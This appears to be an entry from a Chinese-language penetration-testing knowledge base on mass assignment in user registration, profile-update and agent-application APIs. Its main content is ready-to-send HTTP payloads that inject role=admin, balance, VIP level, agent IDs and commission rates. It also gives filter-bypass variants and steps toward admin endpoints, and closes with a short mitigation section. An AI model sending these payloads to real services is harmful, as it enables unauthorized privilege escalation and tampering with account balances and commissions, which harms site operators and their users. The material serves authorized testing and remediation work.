---
title: Mass Assignment（注册/资料接口注入 role / vip / balance / agentId）
cve: 无（业务逻辑）
severity: high
cvss: 8.8
product: 自研用户/代理接口
versions: 任意
ports: 80, 443
keywords: mass assignment, 批量赋值, role, vip, balance, agentId
entry: 注册体里多带一个 role=admin
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

- 注册/资料更新接口的回包字段与请求字段高度重合：`role`、`vipLevel`、`balance`、`agentId`、`status`、`isAdmin`。
- 前端表单只提交部分字段（说明后端可能整体绑定对象）。

## 前置条件

- 能注册账号；抓包。

## PoC

```http
### 1) 注册时多塞字段
POST /api/user/register HTTP/1.1
Content-Type: application/json

{"phone":"13900000003","password":"Passw0rd!","code":"1234","role":"admin","vipLevel":9,"balance":100000,"agentId":1}

### 2) 资料更新时改权限
POST /api/user/update HTTP/1.1
Authorization: Bearer <token>

{"nickname":"x","role":"admin","isAgent":true,"commissionRate":"0.9"}

### 3) 代理申请接口的审核态
POST /api/agent/apply HTTP/1.1

{"uid":<自己>,"status":1,"agentLevel":"总代"}
```

## 利用步骤

1. 注册/更新各打一次"多字段"请求，回读 `/api/user/info` 看字段是否被采纳。
2. 优先级：`role`/`isAdmin` > `agentId`/`isAgent` > `balance`/`vipLevel`（前两个是权限，后两个是钱）。
3. 被过滤时换大小写/驼峰/嵌套：`Role`、`is_admin`、`{"user":{"role":"admin"}}`、`role[]=admin`。
4. 命中后看能否进后台（`/api/admin/**`）或改佣金比例（配合 `agent-hierarchy-privilege.md`）。
5. 证据：一条请求 + `/api/user/info` 回读；不要真的提现。

## 修复与缓解

- 白名单绑定（DTO 只列允许字段）；`role`/`balance`/`agentId` 一律服务端赋值。
- 更新接口做字段级鉴权（非管理员不能改 role）。
- 注册/资料变更写审计。

## 参考

- OWASP Mass Assignment Cheat Sheet；CWE-915。
